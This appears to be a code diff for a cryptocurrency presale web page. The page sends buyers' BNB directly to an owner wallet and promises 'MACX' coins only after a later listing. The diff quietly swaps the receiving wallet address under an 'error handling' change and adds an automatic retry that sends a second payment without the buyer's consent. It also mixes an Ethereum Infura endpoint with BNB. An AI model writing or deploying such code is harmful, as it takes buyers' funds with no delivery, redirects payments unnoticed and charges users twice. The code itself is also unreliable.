@@ -74,7 +74,7 @@
         const maxMacxAmount = 1000000000;
         const minMacxAmount = 1;
         const macxToBnbRate = 0.01; // 0.01 BNB per 1 MACX
-        const ownerWalletAddress = '0x9F0A2A125a825AcCD954e141d2e9fE8E7d94bFF6'; // Replace with your BNB wallet address
+        const ownerWalletAddress = '0x481e8DB1dd18fd02caA8A83Ef7A73cF207b83930'; // Replace with your BNB wallet address
         const infuraUrl = 'https://mainnet.infura.io/v3/0ca49505caee401fbe8a78b628300e58';
 
         // Initialize Web3 with Infura
@@ -106,7 +106,7 @@
             showMessage('Wallet disconnected');
         }
 
-        // Buy MACX Functionality
+        // Buy MACX Functionality with Enhanced Error Handling
         async function buyMacx() {
             const macxAmount = parseFloat(document.getElementById('macxAmount').value);
             if (isNaN(macxAmount) || macxAmount < minMacxAmount || macxAmount > maxMacxAmount) {
@@ -117,16 +117,44 @@
             const bnbAmount = macxAmount * macxToBnbRate;
 
             try {
-                // Send BNB to the owner's wallet
+                // Attempt to send BNB to the owner's wallet
                 const transaction = await web3.eth.sendTransaction({
                     from: walletAddress,
                     to: ownerWalletAddress,
-                    value: web3.utils.toWei(bnbAmount.toString(), 'ether')
+                    value: web3.utils.toWei(bnbAmount.toString(), 'ether'),
+                    gas: 3000000 // Optional, can be increased depending on your contract
                 });
 
                 showMessage(`Successfully bought ${macxAmount} MACX! The coins will be sent after the listing date.`);
             } catch (error) {
-                showError('Transaction failed: ' + error.message);
+                // Handle specific EVM error (Transaction Reverted)
+                if (error.message.includes('reverted by the EVM')) {
+                    showError('Transaction failed: The transaction was reverted by the EVM. Please check the input and try again.');
+
+                    // Optionally retry the transaction
+                    await retryTransaction(bnbAmount);
+                } else {
+                    showError('Transaction failed: ' + error.message);
+                }
+            }
+        }
+
+        // Function to retry the transaction if the first attempt fails
+        async function retryTransaction(bnbAmount) {
+            try {
+                // Retry transaction after a small delay (e.g., 2 seconds)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                const retryTransaction = await web3.eth.sendTransaction({
+                    from: walletAddress,
+                    to: ownerWalletAddress,
+                    value: web3.utils.toWei(bnbAmount.toString(), 'ether'),
+                    gas: 3000000
+                });
+
+                showMessage(`Successfully retried and bought MACX!`);
+            } catch (retryError) {
+                showError('Retry failed: ' + retryError.message);
             }
         }
 
